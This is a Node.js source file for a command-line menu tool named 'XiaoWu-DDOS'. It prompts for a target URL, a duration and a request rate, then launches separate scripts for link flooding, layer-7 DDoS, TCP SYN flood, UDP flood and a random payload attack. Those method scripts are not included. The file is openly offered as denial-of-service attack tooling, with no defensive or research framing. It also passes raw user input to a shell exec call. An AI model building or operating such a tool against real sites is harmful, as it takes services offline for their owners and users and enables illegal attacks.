const 小吴颜色 = require('chalk').default;
const 小吴输入 = require("readline");
const 小吴执行 = require("child_process").exec;

function 小吴启动(小吴方法, 小吴名字) {
    const 小吴界面 = 小吴输入.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    小吴界面.question(小吴颜色.cyan("\n🌐 Masukkan target URL: "), (小吴网址) => {
        小吴界面.question(小吴颜色.cyan("⏳ Durasi attack (detik): "), (小吴时间) => {
            小吴界面.question(小吴颜色.cyan("⚡ Jumlah requests per detik: "), (小吴速率) => {
                console.log(小吴颜色.green(`\n💣 ${小吴名字} mulai ke ${小吴网址} selama ${小吴时间} detik dengan ${小吴速率} req/s...`));
                小吴执行(`node ${小吴方法} ${小吴网址} ${小吴时间} ${小吴速率}`, (小吴错误, 小吴hasil) => {
                    if (小吴错误) console.error(小吴颜色.red(小吴错误));
                    console.log(小吴hasil);
                    小吴界面.close();
                });
            });
        });
    });
}

const 小吴艺术 = 小吴颜色.green(`
ddddddxxxxxxxxxkookxo,xooxxklloxddcdxkddccdddddddx
dddddxxxxxxxxxxxxd:,:;;,l;,:;;cd:ccdldldodxxdxxxxx
dddddxxxxddddddxdl''.;,:co;.....''....';:dxxxxxxkk
dddddddxxxddxxdlddl,...,l:........''.....'lxddxxxk
odddddddxxxxxd:odddl,'.,c..................:dxxxxx
oooooddddxxxo:;;:::;;,'''..............'....:dxxxx
oooooddddddl;,'.',,;,,;,,;;,,,,,.'.'''',,....cxxxx
ooooddddddc,'....''',;,,,;c:,,,;;,,;,,';,....,xxxx
oooodddddl;.......';,'.'';kl'''',,',;',','....dxxx
loooooooo;.......,lc,..,;kOc'',,','',''.''....lxxx
llllooool.......,;:;,;cddOkl:;:::::,'',.'......dxx
lllllllll........'..:lok00Oxdl;'.';;,,,''......dkk
cccllllll,'...',:olllddOKK0Odoxc::;;c:,,,'.....ckk
::::ccccc:.'.'cdkO000kx0KKKXXKKKKK00Oo:,:;'....'dk
;::::::::,.'',lxO000OdkKK0KXXNNNXXXK0d:,:,;;,.''ok
;;;::::::'',',:dkO00kccxdk0XXXXXXXK0Oo:,,'':..'.ck
;;;::::::''';;;oxkO0Oxxk0KKXXXXXKK0Odc;,,'.....,:x
;;:::::::;'';:;:oxkkkdldxOKKKKKK00kxo:''..... .,;o
:::::::ccc;,,::::ldxo::clldO000OOkdoc'...'... .,,l
:::cclllll:::;c;':ldxdxxkO000Okxdoc:'.'.,'. . .,,l
cclloooooollcc:.';;cdkO0KK00Oxdc;;c:...'.......,.:
llooooolllllc,',,;;;:ldkkkxoc;,,col....;.,.....;.;
llllolllccc:'',,,..,;;;;;;;;;coxxx;....;.,'....,.,
ccccccccc:'.',,,'..,,;;;;:coxkkkxl.. ..,..',...'',
:::ccccc:...,,,,...,,;;;:lxkkkxkd:.   .,'.',....''`);

console.clear();
console.log(小吴艺术);
console.log(小吴颜色.cyan("\n🔥 Welcome to XiaoWu-DDOS 🔥"));
console.log(小吴颜色.green("1) Flood Link"));
console.log(小吴颜色.green("2) DDOS Layer7"));
console.log(小吴颜色.green("3) TCP SYN Flood"));
console.log(小吴颜色.green("4) UDP Flood"));
console.log(小吴颜色.green("5) Random Payload Attack"));
console.log(小吴颜色.red("6) Exit\n"));

const 小吴界面 = 小吴输入.createInterface({
    input: process.stdin,
    output: process.stdout
});

小吴界面.question(小吴颜色.yellow("Select method > "), (小吴选择) => {
    switch (小吴选择) {
        case "1":
            小吴启动("method1.js", "Flood Link");
            break;
        case "2":
            小吴启动("method2.js", "DDOS Layer7");
            break;
        case "3":
            小吴启动("method3.js", "TCP SYN Flood");
            break;
        case "4":
            小吴启动("method4.js", "UDP Flood");
            break;
        case "5":
            小吴启动("method5.js", "Random Payload Attack");
            break;
        case "6":
            console.log(小吴颜色.red("\n[!] Exiting..."));
            小吴界面.close();
            break;
        default:
            console.log(小吴颜色.red("\n[!] Invalid option."));
            小吴界面.close();
            break;
    }
});
